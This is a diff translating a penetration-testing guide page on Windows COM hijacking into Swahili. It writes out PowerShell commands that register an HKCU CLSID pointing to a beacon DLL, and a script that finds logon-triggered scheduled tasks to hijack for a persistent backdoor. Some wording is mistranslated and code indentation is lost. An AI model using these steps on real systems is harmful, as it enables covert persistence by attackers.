@@ -2,59 +2,56 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Searching not existent COM components
+### Kutafuta sehemu za COM zisizopo
 
-As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:
+Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mekanismu ya kudumu**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zilizotafutwa ambazo hazipo ambazo mshambuliaji anaweza kuunda ili kudumu. Filters:
 
 - **RegOpenKey** operations.
-- where the _Result_ is **NAME NOT FOUND**.
-- and the _Path_ ends with **InprocServer32**.
+- ambapo _Result_ ni **NAME NOT FOUND**.
+- na _Path_ inaishia na **InprocServer32**.
 
-Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._&#x20;
-
+Mara tu unapokuwa umekamua ni COM ipi isiyopo ya kuiga, tekeleza amri zifuatazo. _Kuwa makini ikiwa utaamua kuiga COM ambayo inaloadi kila sekunde chache kwani hiyo inaweza kuwa kupita kiasi._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
+### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa
 
-### Hijackable Task Scheduler COM components
+Windows Tasks hutumia Custom Triggers kuita vitu vya COM na kwa sababu vinatekelezwa kupitia Task Scheduler, ni rahisi kutabiri wakati vitakavyotolewa.
 
-Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
-
-<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Onyesha CLSIDs za COM
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
 {
-  if ($Task.Actions.ClassId -ne $null)
-  {
-    if ($Task.Triggers.Enabled -eq $true)
-    {
-      $usersSid = "S-1-5-32-545"
-      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
+if ($Task.Actions.ClassId -ne $null)
+{
+if ($Task.Triggers.Enabled -eq $true)
+{
+$usersSid = "S-1-5-32-545"
+$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
 
-      if ($Task.Principal.GroupId -eq $usersGroup)
-      {
-        Write-Host "Task Name: " $Task.TaskName
-        Write-Host "Task Path: " $Task.TaskPath
-        Write-Host "CLSID: " $Task.Actions.ClassId
-        Write-Host
-      }
-    }
-  }
+if ($Task.Principal.GroupId -eq $usersGroup)
+{
+Write-Host "Jina la Kazi: " $Task.TaskName
+Write-Host "Njia ya Kazi: " $Task.TaskPath
+Write-Host "CLSID: " $Task.Actions.ClassId
+Write-Host
+}
+}
+}
 }
 
-# Sample Output:
-<strong># Task Name:  Example
-</strong># Task Path:  \Microsoft\Windows\Example\
+# Mfano wa Matokeo:
+<strong># Jina la Kazi:  Mfano
+</strong># Njia ya Kazi:  \Microsoft\Windows\Mfano\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [more like the previous one...]</code></pre>
+# [zaidi kama ile ya awali...]</code></pre>
 
-Checking the output you can select one that is going to be executed **every time a user logs in** for example.
+Ukikagua matokeo unaweza kuchagua moja ambalo litatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.
 
-Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
-
+Sasa kutafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utaona kwamba thamani hiyo haipo katika HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -62,7 +59,7 @@ Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}
 Name           Property
 ----           --------
 InprocServer32 (default)      : C:\Windows\system32\some.dll
-               ThreadingModel : Both
+ThreadingModel : Both
 
 # Exists in HKLM
 Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
@@ -75,8 +72,6 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-
-Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
+Kisha, unaweza tu kuunda kiingilio cha HKCU na kila wakati mtumiaji anapoingia, nyuma yako itawashwa. 
 
 {{#include ../../banners/hacktricks-training.md}}
-
